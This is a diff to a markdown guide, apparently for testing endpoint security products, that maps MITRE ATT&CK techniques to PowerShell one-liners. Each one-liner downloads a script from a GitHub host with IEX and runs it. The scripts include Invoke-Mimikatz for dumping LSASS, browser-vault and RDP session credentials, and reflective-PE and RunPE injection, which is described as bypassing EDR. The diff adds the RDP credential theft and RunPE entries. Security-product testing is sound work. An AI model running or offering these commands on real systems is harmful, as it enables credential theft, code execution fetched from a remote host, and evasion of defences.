@@ -55,13 +55,18 @@ A more evasive variant that also identifies AmsiScanBuffer function through a me
 Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system,depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
 https://attack.mitre.org/techniques/T1555/
 
-### 1. Lsass logon passwords
+### Lsass logon passwords
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`
 
-### 2. Browser Vault credential theft
+### Browser Vault credential theft
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
+
+### Remote Desktop credentials theft
+Recently was added to Mimikatz, the assumption is that someone is connected the target commputer over the RDP at the moment of theft of those credentials. Perfect to test on servers due to multiple parallel sessions
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug ts::logonpasswords"`
 
 ## OS Credential Dumping: LSASS Memory
 Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
@@ -103,6 +108,15 @@ This also allows to load executable that is not on the disk. We will use the kno
 https://attack.mitre.org/techniques/T1620/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ReflectivePEInjection.ps1"); Invoke-ReflectivePEInjection -ProcName explorer;`
+
+### 3. RunPE Injection
+Similar to Process hollowing with one very important difference, the injection of the executable is done locally within the same process while bypassing EDR solutions,
+Many times implemented as part of advanced malwares such as RAT to evade detection and as part of custom packer.
+
+https://attack.mitre.org/techniques/T1620/
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RunPE.ps1");Invoke-RunPE;`
+
 
 ## Allowlist Bypass (formerly Whitelist bypass)
 "Living-off-the-land" techniques that can be used to bypass Application Whitelisting Protection, usually maintain stealthiness and evasion by abusing inherent architectural weakness of the operating system.
